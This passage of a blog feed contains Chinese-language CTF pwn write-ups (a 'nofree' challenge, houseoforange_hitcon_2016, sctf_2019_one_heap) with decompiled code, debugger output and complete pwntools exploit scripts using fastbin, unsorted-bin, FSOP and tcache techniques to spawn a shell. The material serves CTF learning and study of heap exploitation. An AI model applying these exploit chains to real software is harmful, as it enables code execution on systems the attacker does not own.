+&lt;p&gt;程序只设置了两个功能，new和edit。&lt;/p&gt;
+
+&lt;p&gt;程序在分配堆块时使用了strdup，根据输入的字符个数进行分配。但是没有记录实际的size。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int new(){
+...
+	if ( n &amp;gt;= 0 &amp;amp;&amp;amp; n &amp;lt;= 0x90 )
+    {
+      *&amp;amp;chunklist[0x10 * v1 + 0x100] = mymalloc(n);
+      n = v2;
+      *&amp;amp;chunklist[0x10 * v1 + 0x108] = v2;
+    }
+...
+}
+
+char *__fastcall mymalloc(unsigned int size)
+{
+  memset(chunklist, 0, 0x100uLL);
+  printf(&quot;content: &quot;, 0LL);
+  my_read(chunklist, size);
+  return strdup(chunklist);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;因此在edit处造成了一个溢出。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;__int64 edit()	
+{
+...
+	if ( result )
+    {
+      printf(&quot;content: &quot;);
+      result = my_read(*&amp;amp;chunklist[0x10 * v1 + 0x100], *&amp;amp;chunklist[0x10 * v1 + 0x108]);
+    }
+...
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;除此之外，程序没有其他功能。&lt;/p&gt;
+
+&lt;p&gt;因此，我们需要进行House Of Orange攻击，得到free过的堆块。由于我们能分配的最大chunk大小为0xa0，不足以得到一个unsortbin中的chunk。因此只能先用fastbin进行调整。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;for i in range(30):
+    add(0,0x70,'a'*0x70)
+for i in range(2):
+    add(0,0x90,'a'*0x10)
+add(0,0x90,'a'*0x20)
+edit(0,'\x00'*0x28+p64(0x91)) # 修改topchunk的size
+add(1,0x90,'a'*0x90)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们得到一个fastbin，而且可以通过溢出修改其fd。因此可以利用fastbin attack进行一次分配。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;pwndbg&amp;gt; x/6gx 0x6021c0
+0x6021c0:	0x000000000060ff50	0x0000000000000090  # 可以溢出到fastbin
+0x6021d0:	0x0000000000630010	0x0000000000000090
+0x6021e0:	0x0000000000000000	0x0000000000000000
+pwndbg&amp;gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x60ff70 --&amp;gt; 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x6300a0 (size : 0x21f60) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;利用0x6021d8把堆块分配过去。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;chunk1 = 0x6021d0
+edit(0,'\x00'*0x28+p64(0x71)+p64(chunk1))
+add(0,0x90,'a'*0x60)
+add(1,0x70,'a')
+add(0,0x70,'a'*0x60)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;pwndbg&amp;gt; x/6gx 0x6021c0
+0x6021c0:	0x00000000006021e0	0x0000000000000070
+0x6021d0:	0x00000000013640b0	0x0000000000000070
+0x6021e0:	0x6161616161616161	0x6161616161616161
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们可以利用chunk0控制chunk2指针，从而实现任意地址写。&lt;/p&gt;
+
+&lt;p&gt;为了分配任意大小的chunk，我们需要将memset的got表改成ret的地址。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;ret = 0x0000000000400C34
+memset_got = 0x602038
+edit(0,p64(memset_got)+p64(0x90))
+edit(2,p64(ret))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时再次进行House Of Orange攻击，利用buf区(0x6020c0)残留的字符将top chunk送入unsorted bin。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;for i in range(28):
+    add(1,0x70,'a'*0x70)
+for i in range(3):
+    add(1,0x70,'a'*0x10+'\x00')
+buf = 0x6020c0
+edit(0,p64(buf+0x90)+p64(0x90))
+edit(2,'a'*0x50)
+add(2,0x70,'a'*0x20+'\x00')
+edit(2,'\x00'*0x28+p64(0xb1))
+add(1,0x90,'a'*0x90)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到一个可控的unsorted bin chunk。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;pwndbg&amp;gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x1a010f0 (size : 0x21f10) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x19dff50 (size : 0x90)
+pwndbg&amp;gt; x/6gx 0x6021c0
+0x6021c0:	0x00000000006021e0	0x0000000000000070
+0x6021d0:	0x0000000001a01010	0x0000000000000090
+0x6021e0:	0x00000000019dff30	0x0000000000000070 # 溢出到unsorted bin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后进行unsorted bin attack，将一个libc地址写入buf区。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;payload = '\x00'*0x28+p64(0x91)+p64(0)+p64(buf-0x10)
+edit(2,payload)
+add(1,0x90,'a'*0x80+'\x00')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到一个libc地址&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;pwndbg&amp;gt; x/8gx 0x6020c0
+0x6020c0:	0x00007fa36b06ab78	0x6161616161616161
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后修改strdup_got为puts_plt，再new，得到libc地址。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;edit(0,p64(strdup_got))
+edit(2,p64(puts_plt))
+add(1,0x20,'\xa0')
+libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4ba0
+log.info('libc.address : '+hex(libc.address))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;修改strdup_got为libc.sym[‘system’]然后new，内容为/bin/sh，成功执行system(“/bin/sh”)。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;edit(2,p64(libc.sym['system']))
+add(1,0x20,'/bin/sh\x00')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;完整exp：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+elf = ELF(&quot;./nofree&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+#context.log_level = 'debug'
+
+def add(idx,size,con):
+    io.sendlineafter(&quot;choice&amp;gt;&amp;gt; &quot;,'1')
+    io.sendlineafter(&quot;idx:&quot;,str(idx))
+    io.sendlineafter(&quot;size: &quot;,str(size))
+    io.sendafter(&quot;content: &quot;,con)
+    
+def edit(idx,con):
+    io.sendlineafter(&quot;choice&amp;gt;&amp;gt;&quot;,'2')
+    io.sendlineafter(&quot;idx:&quot;,str(idx))
+    io.sendafter(&quot;content: &quot;,con)
+
+ret = 0x0000000000400C34
+buf = 0x6020c0
+chunk1 = 0x6021d0
+
+memset_got = 0x602038
+strdup_got = 0x602068
+puts_plt = 0x4006D0
+
+#io = process(&quot;./nofree&quot;)
+io = remote(&quot;101.200.53.148&quot;,12301)
+for i in range(30):    
+    add(0,0x70,'a'*0x70)
+for i in range(2):
+    add(0,0x90,'a'*0x10)
+add(0,0x90,'a'*0x20)
+edit(0,'\x00'*0x28+p64(0x91))
+add(1,0x90,'a'*0x90)
+edit(0,'\x00'*0x28+p64(0x71)+p64(chunk1))
+add(0,0x90,'a'*0x60)
+add(1,0x70,'a')
+add(0,0x70,'a'*0x60)
+edit(0,p64(memset_got)+p64(0x90))
+edit(2,p64(ret))
+for i in range(28):
+    add(1,0x70,'a'*0x70)
+for i in range(3):
+    add(1,0x70,'a'*0x10+'\x00')
+edit(0,p64(buf+0x90)+p64(0x90))
+edit(2,'a'*0x50)
+add(2,0x70,'a'*0x20+'\x00')
+edit(2,'\x00'*0x28+p64(0xb1))
+add(1,0x90,'a'*0x90)
+payload = '\x00'*0x28+p64(0x91)+p64(0)+p64(buf-0x10)
+edit(2,payload)
+add(1,0x90,'a'*0x80+'\x00')
+edit(0,p64(strdup_got))
+edit(2,p64(puts_plt))
+add(1,0x20,'\xa0')
+libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4ba0
+log.info('libc.address : '+hex(libc.address))
+edit(2,p64(libc.sym['system']))
+add(1,0x20,'/bin/sh\x00')
+io.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;后来学长看了看，应该不是最优解。还能改printf的。&lt;/p&gt;
+
+&lt;h3 id=&quot;houseoforange_hitcon_2016&quot;&gt;houseoforange_hitcon_2016&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ file houseoforange_hitcon_2016
+houseoforange_hitcon_2016: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped
+$ checksec houseoforange_hitcon_2016 
+[*] '/home/surager/work/houseoforange_hitcon_2016'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;64位程序，保护全开。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;if ( malloctimes &amp;gt; 3u )
+  {
+    puts(&quot;Too many house&quot;);
+    exit(1);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;程序限制了malloc的次数为4次。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;  v3 = malloc(0x10uLL);
+  printf(&quot;Length of name :&quot;);
+  size = read_int();
+  if ( size &amp;gt; 0x1000 )
+    size = 4096;
+  v3[1] = malloc(size);
+  if ( !v3[1] )
+  {
+    puts(&quot;Malloc error !!!&quot;);
+    exit(1);
+  }
+  printf(&quot;Name :&quot;);
+  myread(v3[1], size);
+  v4 = calloc(1uLL, 8uLL);
+  printf(&quot;Price of Orange:&quot;, 8LL);
+  *v4 = read_int();
+  orangemenu();
+  printf(&quot;Color of Orange:&quot;);
+  size_4 = read_int();
+  if ( size_4 != 56746 &amp;amp;&amp;amp; (size_4 &amp;lt;= 0 || size_4 &amp;gt; 7) )
+  {
+    puts(&quot;No such color&quot;);
+    exit(1);
+  }
+  if ( size_4 == 56746 )
+    v4[1] = 56746;
+  else
+    v4[1] = size_4 + 30;
+  *v3 = v4;
+  chunkptr = v3;
+  ++malloctimes;
+  return puts(&quot;Finish&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;先malloc一个chunk，然后用这个chunk再存一个自由size的chunk和0x20的chunk。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;  if ( freetimes &amp;gt; 2u )
+    return puts(&quot;You can't upgrade more&quot;);
+  if ( !chunkptr )
+    return puts(&quot;No such house !&quot;);
+  printf(&quot;Length of name :&quot;);
+  v2 = read_int();
+  if ( v2 &amp;gt; 0x1000 )
+    v2 = 4096;
+  printf(&quot;Name:&quot;);
+  myread(chunkptr[1], v2);
+  printf(&quot;Price of Orange: &quot;, v2);
+  v1 = *chunkptr;
+  *v1 = read_int();
+  orangemenu();
+  printf(&quot;Color of Orange: &quot;);
+  v3 = read_int();
+  if ( v3 != 56746 &amp;amp;&amp;amp; (v3 &amp;lt;= 0 || v3 &amp;gt; 7) )
+  {
+    puts(&quot;No such color&quot;);
+    exit(1);
+  }
+  if ( v3 == 56746 )
+    *(*chunkptr + 4LL) = 56746;
+  else
+    *(*chunkptr + 4LL) = v3 + 30;
+  ++freetimes;
+  return puts(&quot;Finish&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;限制edit次数为3次。存在溢出。&lt;/p&gt;
+
+&lt;p&gt;没有free。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;1.直接修改top chunk的size，触发house of orange（largebin范围内）。然后切割unsorted bin。得到libc和heap地址。&lt;/p&gt;
+
+&lt;p&gt;2.使用unsorted bin攻击_IO_list_all，然后伪造unsortedbin成struct _IO_FILE_plus，使malloc发生错误时能够执行伪造的堆块的内容。&lt;/p&gt;
+
+&lt;p&gt;3.使用malloc，得到shell。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;exp&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+#io = process([&quot;./houseoforange_hitcon_2016&quot;])
+io = remote(&quot;node3.buuoj.cn&quot;,27667)
+elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)
+libc = ELF(&quot;./x64-libc-2.23.so&quot;)
+context.terminal = ['tmux','splitw','-h']
+#context.log_level = 'debug'
+
+def add(size,name):
+        io.sendlineafter(&quot;Your choice : &quot;,'1')
+        io.sendlineafter(&quot;Length of name :&quot;,str(size))
+        io.sendafter(&quot;Name :&quot;,name)
+        io.sendlineafter(&quot;Price of Orange:&quot;,'1')
+        io.sendlineafter(&quot;Color of Orange:&quot;,'3')
+
+def show():
+        io.sendlineafter(&quot;Your choice : &quot;,'2')
+
+def edit(size,name):
+        io.sendlineafter(&quot;Your choice : &quot;,'3')
+        io.sendlineafter(&quot;Length of name :&quot;,str(size))
+        io.sendafter(&quot;Name:&quot;,name)
+        io.sendlineafter(&quot;Price of Orange:&quot;,'1')
+        io.sendlineafter(&quot;Color of Orange:&quot;,'3')
+
+def dbg():
+        gdb.attach(io)
+        pause()
+        exit(0)
+
+add(0x30,'asdf')
+payload = '\x00'*0x30 + p64(0) + p64(0x21) + p64(0x0000002100000001) + p64(0) +p64(0) + p64(0xf81)
+edit(len(payload),payload)
+add(0x1000,'a')
+add(0x400,'a')
+show()
+libc.address = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,'\x00'))-0x3c5161
+log.info(&quot;libc.address : &quot;+hex(libc.address))
+edit(0x11,'a'*0x11)
+show()
+io.recvuntil(&quot;a&quot;*0x10)
+heapbase = u64(io.recv(6).ljust(8,'\x00'))-0x61
+log.info(&quot;heapbase : &quot;+hex(heapbase))
+payload = 'a'*0x400
+payload += p64(0) + p64(0x21) + p64(0x0000002100000001) + p64(0)
+fakefile = '/bin/sh\x00' + p64(0x61) + p64(0) + p64(libc.sym[&quot;_IO_list_all&quot;]-0x10) +p64(0) + p64(1)
+fakefile = fakefile.ljust(0xc0,'\x00')
+fakefile += p64(0)*3 + p64(heapbase+0x5e8)+p64(0)*2+p64(libc.sym[&quot;system&quot;])
+payload += fakefile
+edit(len(payload),payload)
+io.sendline(&quot;1&quot;)
+io.interactive()
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">House of 🍊</summary></entry><entry><title type="html">sctf_2019_one_heap</title><link href="http://localhost:4000/_posts/2020-09-05-sctf_2019_one_heap/" rel="alternate" type="text/html" title="sctf_2019_one_heap" /><published>2020-09-05T00:00:00+08:00</published><updated>2020-09-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/sctf_2019_one_heap</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-05-sctf_2019_one_heap/">&lt;h1 id=&quot;sctf_2019_one_heap&quot;&gt;sctf_2019_one_heap&lt;/h1&gt;
+
+&lt;h2 id=&quot;写在前面&quot;&gt;写在前面&lt;/h2&gt;
+
+&lt;p&gt;最近感觉到自己的解题技巧没有达到应该的水平，导致自己无论在比赛还是在平常的做题当中都感觉到力不从心。&lt;/p&gt;
+
+&lt;p&gt;昨天做到了一道题，题目的内容非常简单。只有一个add和一个delete，只保留了一个指针。而且对malloc和free的次数进行了限制。使用的libc是2.27版本的。因为有了tcache，此题的难度没有太大。&lt;/p&gt;
+
+&lt;p&gt;整体来说，此题很考验解题人对堆利用的技巧。所以记录一下。&lt;/p&gt;
+
+&lt;h2 id=&quot;程序分析&quot;&gt;程序分析&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;# surager @ ubuntu in ~/work [15:34:26] 
+$ file sctf_2019_one_heap
+sctf_2019_one_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=84e0a50551fc4f6d2ce2466a50d04427f1919877, stripped
+
+# surager @ ubuntu in ~/work [15:34:29] 
+$ checksec sctf_2019_one_heap
+[*] '/home/surager/work/sctf_2019_one_heap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;保护全开。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned __int64 add()
+{
+  unsigned int v0; // eax
+  size_t v1; // rbx
+  unsigned __int64 v3; // [rsp+8h] [rbp-10h]
+
+  v3 = __readfsqword(0x28u);
+  if ( !malloctimes )                           // 15
+LABEL_5:
+    exit(0);
+  _printf_chk(1LL, &quot;Input the size:&quot;);
+  v0 = read_int();
+  v1 = v0;
+  if ( v0 &amp;gt; 0x7F )
+  {
+    puts(&quot;Invalid size!&quot;);
+    goto LABEL_5;
+  }
+  _printf_chk(1LL, &quot;Input the content:&quot;);
+  ptr = malloc(v1);
+  my_read(ptr, v1);
+  puts(&quot;Done!&quot;);
+  --malloctimes;
+  return __readfsqword(0x28u) ^ v3;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;限制了size，限制了malloc次数。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned __int64 delete()
+{
+  unsigned __int64 v1; // [rsp+8h] [rbp-10h]
+
+  v1 = __readfsqword(0x28u);
+  if ( !freetimes )                             // 4
+    exit(0);
+  free(ptr);
+  puts(&quot;Done!&quot;);
+  --freetimes;
+  return __readfsqword(0x28u) ^ v1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;没有清除指针，只有一个指针可用。而且只能free四次。&lt;/p&gt;
+
+&lt;h2 id=&quot;思路&quot;&gt;思路&lt;/h2&gt;
+
+&lt;p&gt;现在清楚我们需要解决的问题。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt;怎么实现任意地址写。&lt;/p&gt;
+
+&lt;p&gt;这个比较简单，double free一个tcache即可。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt;怎么leak信息。&lt;/p&gt;
+
+&lt;p&gt;没有show的函数，这里只能打stdout进行leak。概率1/16。但是打stdout的话需要一个libc地址，怎么得到一个libc地址呢。。&lt;/p&gt;
+
+&lt;p&gt;最简单的思路是打tcache_perthread_struct。但是只是这样的话就得花费三个free的代价。而且指针还不一定调得回来。&lt;/p&gt;
+
+&lt;p&gt;第二个思路是直接add三次，造成某一个tcache的数量成为255(-1)，这样就可以直接在原地将此chunk送入unsorted bin，直接修改fd低三位打IO_FILE。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;一顿操作之后如何打malloc_hook。&lt;/p&gt;
+
+&lt;p&gt;一顿乱操作之后，发现只剩一个unsorted bin和一个用来隔开top chunk的tcache bin。但是这里的unsorted bin是可控的。因为在分配到IO_FILE之前的那次malloc时是在原位置malloc的，因此我们可以修改unsorted bin的大小，从而将那个tcache bin包含入其中，从而得到一个tcache链，把堆块分配到malloc_hook。&lt;/p&gt;
+
+&lt;h2 id=&quot;exp分析&quot;&gt;exp分析&lt;/h2&gt;
+
+&lt;p&gt;我们先double free一个足够大的chunk，然后找一个chunk隔开top chunk。这里的0x3f的chunk内容留一个伏笔。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;add(0x7f,'a')
+free()
+free()
+add(0x3f,'\x00'*0x20+p64(0x90)+'\x20')
+free()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后三次add。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;add(0x7f,'')
+add(0x7f,'')
+add(0x7f,'')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;造成的结果。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;(0x90)   tcache_entry[7](255): ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后free，直接进unsorted bin。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;            unsortbin: 0x558b2f75e250 (size : 0x90)
+(0x50)   tcache_entry[3](1): 0x558b2f75e2f0
+(0x90)   tcache_entry[7](255): 0x558b2f75e260 (overlap chunk with 0x558b2f75e250(freed) )
+
+pwndbg&amp;gt; x/32gx 0x558b2f75e250
+0x558b2f75e250:	0x0000000000000000	0x0000000000000091
+0x558b2f75e260:	0x00007f214dcc8ca0	0x00007f214dcc8ca0
+0x558b2f75e270:	0x0000000000000000	0x0000000000000000
+0x558b2f75e280:	0x0000000000000000	0x0000000000000000
+0x558b2f75e290:	0x0000000000000000	0x0000000000000000
+0x558b2f75e2a0:	0x0000000000000000	0x0000000000000000
+0x558b2f75e2b0:	0x0000000000000000	0x0000000000000000
+0x558b2f75e2c0:	0x0000000000000000	0x0000000000000000
+0x558b2f75e2d0:	0x0000000000000000	0x0000000000000000
+0x558b2f75e2e0:	0x0000000000000090	0x0000000000000050
+0x558b2f75e2f0:	0x0000000000000000	0x0000000000000000
+0x558b2f75e300:	0x0000000000000000	0x0000000000000000
+0x558b2f75e310:	0x0000000000000090	0x0000000000000030
+0x558b2f75e320:	0x0000000000000000	0x0000000000000000
+0x558b2f75e330:	0x0000000000000000	0x0000000000020cd1
+0x558b2f75e340:	0x0000000000000000	0x0000000000000000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样我们可以切割unsorted bin进行指针修改，然后攻击IO_FILE。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;add(0x20,'\x50\xb7')
+add(0x7f,'\x00'*0x28+p64(0x91))
+payload = '\x00'*0x10+p64(0xfbad1880) + p64(0)*3 + '\x00'
+add(0x7f,payload)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里的第二个add的内容可以修改unsorted bin的大小，从而实现chunk overlapping。留个伏笔。&lt;/p&gt;
+
+&lt;p&gt;此时的heap分布如下。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;            unsortbin: 0x55bb1765e280 (size : 0x90)
+(0x50)   tcache_entry[3](1): 0x55bb1765e2f0 (overlap chunk with 0x55bb1765e280(freed) )
+(0x90)   tcache_entry[7](253): 0
+pwndbg&amp;gt; x/32gx 0x55bb1765e280
+0x55bb1765e280:	0x0000000000000000	0x0000000000000091
+0x55bb1765e290:	0x00007f892592aca0	0x00007f892592aca0
+0x55bb1765e2a0:	0x0000000000000000	0x0000000000000000
+0x55bb1765e2b0:	0x0000000000000000	0x0000000000000000
+0x55bb1765e2c0:	0x0000000000000000	0x0000000000000000
+0x55bb1765e2d0:	0x0000000000000000	0x0000000000000000
+0x55bb1765e2e0:	0x0000000000000060	0x0000000000000050
+0x55bb1765e2f0:	0x0000000000000000	0x0000000000000000
+0x55bb1765e300:	0x0000000000000000	0x0000000000000000
+0x55bb1765e310:	0x0000000000000090	0x0000000000000020
+0x55bb1765e320:	0x0000000000000000	0x0000000000000000
+0x55bb1765e330:	0x0000000000000000	0x0000000000020cd1
+0x55bb1765e340:	0x0000000000000000	0x0000000000000000
+0x55bb1765e350:	0x0000000000000000	0x0000000000000000
+0x55bb1765e360:	0x0000000000000000	0x0000000000000000
+0x55bb1765e370:	0x0000000000000000	0x0000000000000000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于我们的修改，unsorted bin的size被改成了0x90。而此时如果直接切割chunk的话，会造成程序崩溃。原因是size和prev size不对应。所以我们在开头的那个chunk中写入了一个伪造的chunk头&lt;code&gt;0x55bb1765e310:	0x0000000000000090	0x0000000000000030&lt;/code&gt;。这样就不会造成程序崩溃了。&lt;/p&gt;
+
+&lt;p&gt;之后切割，将malloc_hook填入之前的tcache之中即可。（此处需realloc调整栈帧）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;io.sendline(&quot;1&quot;)
+io.sendlineafter(&quot;size:&quot;,str(0x70))
+payload = p64(0)*11+p64(0x51)+p64(libc.sym[&quot;__malloc_hook&quot;]-0x8)
+io.sendlineafter(&quot;content:&quot;,payload)
+add(0x40,'')
+add(0x40,p64(libc.address + 0x10a38c)+p64(libc.sym['__libc_realloc']+4))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;完整exp&quot;&gt;完整exp&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+elf = ELF(&quot;./sctf_2019_one_heap&quot;)
+libc = ELF(&quot;./x64-libc-2.27.so&quot;)
+#context.log_level = 'debug'
+
+ip = &quot;node3.buuoj.cn&quot;
+port = 27612
+
+def add(size,con):
+    io.sendlineafter(&quot;choice:&quot;,'1')
+    io.sendlineafter(&quot;size:&quot;,str(size))
+    io.sendlineafter(&quot;content:&quot;,con)
+
+def free():
+		io.sendlineafter(&quot;choice:&quot;,'2')
+
+def dbg():
+    gdb.attach(io)
+    pause()
+
+while 1:
+    try:
+        io = process([&quot;./sctf_2019_one_heap&quot;])
+        #io = remote(ip,port)
+        add(0x7f,'a')
+        free()
+        free()
+        add(0x3f,'\x00'*0x20+p64(0x90)+'\x20')
+        free()
+        add(0x7f,'')
+        add(0x7f,'')
+        add(0x7f,'')
+        free()
+        add(0x20,'\x50\xb7')
+        add(0x7f,'\x00'*0x28+p64(0x91))
+        payload = '\x00'*0x10+p64(0xfbad1880) + p64(0)*3 + '\x00'
+        add(0x7f,payload)
+        libcbase = io.recv()
+        if not('\x7f' in libcbase):
+            io.close()
+            continue
+        idx = libcbase.find(&quot;\x7f&quot;)
+        libc.address = u64(libcbase[idx-5:idx+1].ljust(8,'\x00')) - 0x3ed8b0
+        log.info(&quot;libc.address : &quot;+ hex(libc.address))
+        dbg()
+        break
+        io.sendline(&quot;1&quot;)
+        io.sendlineafter(&quot;size:&quot;,str(0x70))
+        payload = p64(0)*11+p64(0x51)+p64(libc.sym[&quot;__malloc_hook&quot;]-0x8)
+        io.sendlineafter(&quot;content:&quot;,payload)
+        add(0x40,'')
+        add(0x40,p64(libc.address + 0x10a38c)+p64(libc.sym['__libc_realloc']+4))
+        #add(0x50,'')
+        io.interactive()
+        break
+    except:
+        io.close()
+        continue
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;写在后面&quot;&gt;写在后面&lt;/h2&gt;
+
+&lt;p&gt;说实话，有时候这种题目直接给我吓死了，做也不敢做。但是实际上好好分析下来，只是细节问题罢了。真正的技巧是不断做题摸索出来的。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">sctf_2019_one_heap</summary></entry></feed>
